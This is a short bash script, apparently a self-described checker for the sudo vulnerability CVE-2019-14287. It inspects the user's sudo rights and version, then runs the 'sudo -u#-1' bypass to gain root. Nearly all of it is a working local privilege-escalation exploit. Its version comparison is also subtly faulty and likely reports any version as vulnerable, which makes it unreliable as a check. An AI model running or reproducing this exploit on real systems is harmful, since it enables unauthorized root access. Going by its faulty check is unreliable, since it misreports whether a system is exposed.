#!/bin/bash

# created by n0w4n
# script to check for CVE-2019-14287

# set var for exploitable version sudo
varSudoExploit='1,8,28'

sudo -l &>/dev/null

# check if current user has sudo ALL permission
sudo -l | \grep -e 'ALL.:.ALL' &>/dev/null
if [[ $? -eq 0 ]]
then
	echo -e '[-] This user has sudo ALL permission'
	echo -e '[-] You are basically root'
	echo -e '[-] Exiting'
else
	# if user has sudo rights, but no ALL permission
	sudo -l &>/dev/null
	if [[ $? -eq 1 ]]
	then
		echo -e 'This user has no sudo rights!'
	else
		# set var with program which user can use
		varSudo=$(sudo -l | \grep '(' | cut -d/ -f2-)
		echo -e '[-] This user has sudo rights'
		echo -e '[-] Checking sudo version'
		# set var with current sudo version to verify vulnerability
		varVersion=$(sudo --version | \grep -i 'sudo version' | awk '{print $3}' | sed 's/\./,/g' | cut -c -6)
		if ((  $varVersion < $varSudoExploit ))
		then
			echo -e '[-] This sudo version is vulnerable'
			echo -e '[-] Trying to exploit'
			sudo -u#-1 /$varSudo
		else
			echo -e '[-] This sudo version is not vulnerable'
			echo -e '[-] Exiting'
		fi
	fi
fi
